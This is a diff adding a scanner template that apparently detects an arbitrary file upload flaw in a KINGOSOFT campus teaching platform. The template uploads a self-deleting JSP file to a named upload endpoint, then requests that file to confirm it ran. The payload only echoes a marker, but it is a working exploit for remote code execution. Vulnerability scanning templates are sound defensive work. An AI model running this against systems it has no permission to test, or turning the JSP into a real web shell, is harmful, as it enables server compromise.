@@ -1,0 +1,65 @@
+id: kingosoft-usctcsp-uploadfile-anyfile-upload
+
+info:
+  name: KINGOSOFT高校智慧校园教学综合服务平台 Upload File Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: "{{rand_text_alphanumeric(5)}}"
+  t2: "{{base64(t1)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: file-upload
+    method: POST
+    path:
+      - "{{BaseURL}}/kyfw/frame/sbxm.sbxm.uploadfile.jsp"
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKNt0t4vBe8cX9rZk
+    body: |-
+      ------WebKitFormBoundaryKNt0t4vBe8cX9rZk
+      Content-Disposition: form-data; name="file"; filename="{{t1}}.jsp"
+      Content-Type: text/plain
+
+      <% out.print("{{t2}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+      ------WebKitFormBoundaryKNt0t4vBe8cX9rZk--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - ".jsp"
+        part: body
+      - type: word
+        words:
+          - "上传处理页面"
+        part: body
+        condition: or
+    extractors:
+      - type: regex
+        name: file
+        internal: true
+        regex:
+          - "source/uploadfile/(.*?).jsp"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/source/uploadfile/{{file}}.jsp"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
